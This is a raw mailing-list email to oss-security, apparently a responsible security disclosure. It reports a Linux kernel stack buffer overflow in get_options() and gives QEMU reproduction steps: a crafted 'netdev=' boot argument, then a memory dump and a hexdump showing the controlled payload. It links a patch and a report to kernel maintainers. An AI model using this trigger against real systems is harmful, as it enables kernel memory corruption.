X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4901" "Tuesday" "30" "May" "2017" "08:17:54" "+0400" "Ilya Matveychikov" "matvejchikov@gmail.com" "<EBDB967B-92F8-47B9-AC79-CBF338A835F2@gmail.com>" "131" "[oss-security] Linux kernel: stack buffer overflow with controlled payload in get_options() function" "^Cc:" nil nil "5" "2017053004:17:54" "[oss-security] Linux kernel: stack buffer overflow with controlled payload in get_options() function" (number mark "        matvejchikov May 30  131/4901  " thread-indent "\"[oss-security] Linux kernel: stack buffer overflow with controlled payload in get_options() function\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 21903 invoked by uid 550); 30 May 2017 10:02:05 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 11783 invoked from network); 30 May 2017 04:18:07 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=from:content-transfer-encoding:mime-version:subject:message-id:date
         :cc:to;
        bh=RXmtphLSvXCeIJCHILwu7awwwFmzq0gu2kIq5KDofSw=;
        b=B9b3yXmQICvU+zUjvUridwuXtpXSrp5g/ckxpJq2CnR0mjra71T1L5AqkjmJ+8EFJF
         FvZkgnuGoifcpkVr6T1wHgwF5LYH/0SqG/elGbB23DCoP5rpGAlmaxDIKsd9ZwBp1ugJ
         mGUZBPLA/3IcRgEFyhfN4nzV2YHQlZNShYFibSY5H6qBmP7Q2aQG9FTj0AMSsnlgDZ3O
         yVCLDUSHuk+yfeESTW6mroIF0QUfP+jPS4jEJCvK9Uaew3oaJ6/TRjX4+FP2Oy4yE5uz
         E1tpk/qUECIua5Q0IQIVLkjP2ud63AHXvziXMvltaVrJOio0MOqDv5tztOfYD5JSbt6J
         qpsQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:from:content-transfer-encoding:mime-version
         :subject:message-id:date:cc:to;
        bh=RXmtphLSvXCeIJCHILwu7awwwFmzq0gu2kIq5KDofSw=;
        b=h7Se+MY7oqbax0FoEqcdnnLVuCQbAw//geWUyA5OzeQDP/Iohv6ECrJQuXS+sSaX1r
         tV3tFlAV4YE1AqclEoid9/zbwe3GRqirEzaERr1YEhRTo1gdbW+JA12RiM+1dw4zjvCT
         Fnt1fkj+NlshRkhYBDik5YTC1pSUTlsO1hdldjg5KxtSwZ9g9f48PFrvYKC35AIRqWjH
         BbfM+4kP3qGsbQFXAwZJFKBtMQK9Ua/ef39wplUdY7EctUYZrjObP+wDt1OIKaTRwabH
         oHFmO/++GXqwa9mlVNcCS93rGma4uLROSYoReOR5klqiVRblMxSGbKRkxjlDfuHCLHJa
         7Q3g==
X-Gm-Message-State: AODbwcA0M+YMvHHqdxvSZfy5rl6Zqr37RxIAkgw5NvHS4tr+ENlXLLrw
	y9ckDYiR3Vukd8It6j4=
X-Received: by 10.28.84.14 with SMTP id i14mr174509wmb.81.1496117876084;
        Mon, 29 May 2017 21:17:56 -0700 (PDT)
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable
Mime-Version: 1.0 (Mac OS X Mail 10.3 \(3273\))
Message-Id: <EBDB967B-92F8-47B9-AC79-CBF338A835F2@gmail.com>
X-Mailer: Apple Mail (2.3273)
Cc: Roee Hay <roeehay@gmail.com>
Date: Tue, 30 May 2017 08:17:54 +0400
From: Ilya Matveychikov <matvejchikov@gmail.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Linux kernel: stack buffer overflow with controlled payload in get_options() function
To: oss-security@lists.openwall.com

Hello,

I=E2=80=99ve found the bug in get_options() function which is used for pars=
ing
kernel=E2=80=99s cmdline string. The bug is similar to CVE-2017-1000363 des=
cribed
by Roee Hay (https://alephsecurity.com/vulns/aleph-2017023).

Details
=3D=3D=3D=3D=3D=3D=3D

When using get_options() it's possible to specify a range of numbers,
like 1-100500. The problem is that it doesn't track array size while
calling internally to get_range() which iterates over the range and
fills the memory with numbers.

Given that one can use =E2=80=9Cnetdev=3Dmin-max=E2=80=9D option to cause s=
tack overflow
with controlled payload. Here are some simple steps to reproduce the
problem in QEMU-based virtual environment:

1) Run kernel in QEMU and wait for system halt:

  $ qemu-system-x86_64 -no-reboot -no-shutdown -kernel \
    /boot/vmlinuz-4.4.0-66-generic -append "netdev=3D3735928559-3735999999"

2) After the system halt enter in QEMU console by pressing Ctrl-Alt-2 and d=
ump
  all the guest's machine memory:

  compat_monitor0 console
  QEMU 2.5.0 monitor - type 'help' for more information
  (qemu) dump-gest-memory dump <ENTER>
  (qemu) quit <ENTER>

3) Look for pair of magic numbers (deadbeef,deadbef0) in "dump" file:

  $ hexdump -C dump | grep "ef be ad de f0 be ad de"
  01de42e0  ef be ad de f0 be ad de  f1 be ad de f2 be ad de  |............=
....|

4) Follow address <01de42e0> in hexdump:

  01de42e0  ef be ad de f0 be ad de  f1 be ad de f2 be ad de  |............=
....|
  01de42f0  f3 be ad de f4 be ad de  f5 be ad de f6 be ad de  |............=
....|
  01de4300  f7 be ad de f8 be ad de  f9 be ad de fa be ad de  |............=
....|
  01de4310  fb be ad de fc be ad de  fd be ad de fe be ad de  |............=
....|
  01de4320  ff be ad de 00 bf ad de  01 bf ad de 02 bf ad de  |............=
....|
  01de4330  03 bf ad de 04 bf ad de  05 bf ad de 06 bf ad de  |............=
....|
  01de4340  07 bf ad de 08 bf ad de  09 bf ad de 0a bf ad de  |............=
....|
  01de4350  0b bf ad de 0c bf ad de  0d bf ad de 0e bf ad de  |............=
....|
  01de4360  0f bf ad de 10 bf ad de  11 bf ad de 12 bf ad de  |............=
....|
  01de4370  13 bf ad de 14 bf ad de  15 bf ad de 16 bf ad de  |............=
....|
  01de4380  17 bf ad de 18 bf ad de  19 bf ad de 1a bf ad de  |............=
....|
  01de4390  1b bf ad de 1c bf ad de  1d bf ad de 1e bf ad de  |............=
....|
  01de43a0  1f bf ad de 20 bf ad de  21 bf ad de 22 bf ad de  |.... ...!...=
"...|
  01de43b0  23 bf ad de 24 bf ad de  25 bf ad de 26 bf ad de  |#...$...%...=
&...|
  01de43c0  27 bf ad de 28 bf ad de  29 bf ad de 2a bf ad de  |'...(...)...=
*...|
  01de43d0  2b bf ad de 2c bf ad de  2d bf ad de 2e bf ad de  |+...,...-...=
....|
  01de43e0  2f bf ad de 30 bf ad de  31 bf ad de 32 bf ad de  |/...0...1...=
2...|
  01de43f0  33 bf ad de 34 bf ad de  35 bf ad de 36 bf ad de  |3...4...5...=
6...|
  01de4400  37 bf ad de 38 bf ad de  39 bf ad de 3a bf ad de  |7...8...9...=
:...|
  01de4410  3b bf ad de 3c bf ad de  3d bf ad de 3e bf ad de  |;...<...=3D.=
..>...|
  01de4420  3f bf ad de 40 bf ad de  41 bf ad de 42 bf ad de  |?...@...A...=
B...|
  01de4430  43 bf ad de 44 bf ad de  45 bf ad de 46 bf ad de  |C...D...E...=
F...|
  01de4440  47 bf ad de 48 bf ad de  49 bf ad de 4a bf ad de  |G...H...I...=
J...|
  01de4450  4b bf ad de 4c bf ad de  4d bf ad de 4e bf ad de  |K...L...M...=
N...|
  01de4460  4f bf ad de 50 bf ad de  51 bf ad de 52 bf ad de  |O...P...Q...=
R...|
  01de4470  53 bf ad de 54 bf ad de  55 bf ad de 56 bf ad de  |S...T...U...=
V...|
  01de4480  57 bf ad de 58 bf ad de  59 bf ad de 5a bf ad de  |W...X...Y...=
Z...|
  01de4490  5b bf ad de 5c bf ad de  5d bf ad de 5e bf ad de  |[...\...]...=
^...|
  01de44a0  5f bf ad de 60 bf ad de  61 bf ad de 62 bf ad de  |_...`...a...=
b...|
  01de44b0  63 bf ad de 64 bf ad de  65 bf ad de 66 bf ad de  |c...d...e...=
f...|
  01de44c0  67 bf ad de 68 bf ad de  69 bf ad de 6a bf ad de  |g...h...i...=
j...|
  01de44d0  6b bf ad de 6c bf ad de  6d bf ad de 6e bf ad de  |k...l...m...=
n...|
  01de44e0  6f bf ad de 70 bf ad de  71 bf ad de 72 bf ad de  |o...p...q...=
r...|
  01de44f0  73 bf ad de 74 bf ad de  75 bf ad de 76 bf ad de  |s...t...u...=
v...|
  01de4500  77 bf ad de 78 bf ad de  79 bf ad de 7a bf ad de  |w...x...y...=
z...|
  01de4510  7b bf ad de 7c bf ad de  7d bf ad de 7e bf ad de  |{...|...}...=
~...|
  01de4520  7f bf ad de 80 bf ad de  81 bf ad de 82 bf ad de  |............=
....|
  01de4530  83 bf ad de 84 bf ad de  85 bf ad de 86 bf ad de  |............=
....|
  01de4540  87 bf ad de 88 bf ad de  89 bf ad de 8a bf ad de  |............=
....|
  01de4550  8b bf ad de 8c bf ad de  8d bf ad de 8e bf ad de  |............=
....|
  ...

The patch for the bug was submitted by me to LKML list recently:
https://lkml.org/lkml/2017/5/22/581

This was reported to security@kernel.org, also.

Ilya Matveychikov=
